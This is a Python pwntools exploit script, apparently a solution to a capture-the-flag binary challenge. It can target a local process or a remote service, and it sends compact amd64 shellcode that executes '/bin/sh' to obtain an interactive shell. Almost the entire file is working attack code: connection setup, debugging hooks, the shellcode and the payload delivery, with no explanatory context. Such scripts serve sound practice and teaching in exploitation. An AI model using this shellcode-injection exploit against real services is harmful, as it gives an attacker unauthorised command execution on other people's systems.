#_*_coding:utf-8_*_
from pwn import *
from pwn import u64,u32,p64,p32
#from ctypes import *
#from ae64 import AE64
context(arch='amd64',os='linux',log_level='debug')
context.terminal = ['tmux', 'splitw', '-h']

elf = ELF("./pwn")
local = 1
if local:
    p = process("./pwn_patched")
else:
    p = remote("shadowchat.top", 8302)
#node2.yuzhian.com.cn:33488
#libc = ELF("./libc-2.27.so")
libc = ELF("./libc.so.6")
uu64 = lambda data :u64(data.ljust(8, b'\x00'))
info = lambda tag, addr :log.info(tag + " -------------> " +hex(addr))
get_addr = lambda :u64(p.recvuntil(b'\x7f')[-6:].ljust(8,b'\x00'))

def get_sb() :
    return libc_base + libc.sym['system'], libc_base + next(libc.search(b'/bin/sh\x00'))


def debug(point):
    if point == 0:
        gdb.attach(p)
    else:
        gdb.attach(p,point)


r = lambda : p.recv()
rx = lambda x: p.recv(x)
rl = lambda : p.recvline()
ru = lambda x: p.recvuntil(x)
rud = lambda x: p.recvuntil(x, drop=True)
s = lambda x: p.send(x)
sl = lambda x: p.sendline(x)
sa = lambda x, y: p.sendafter(x, y)
sla = lambda x, y: p.sendlineafter(x, y)
close = lambda : p.close()
shell = lambda : p.interactive()



shellcode = asm('''
    xor esi, esi
    lea edi, [r15d + 0xe]
    cdq
    mov ax, 0x3b
    syscall
''')


debug('b *$rebase(0x139b)')

sa("shellcode!\n\n",shellcode + b'/bin/sh')

shell()
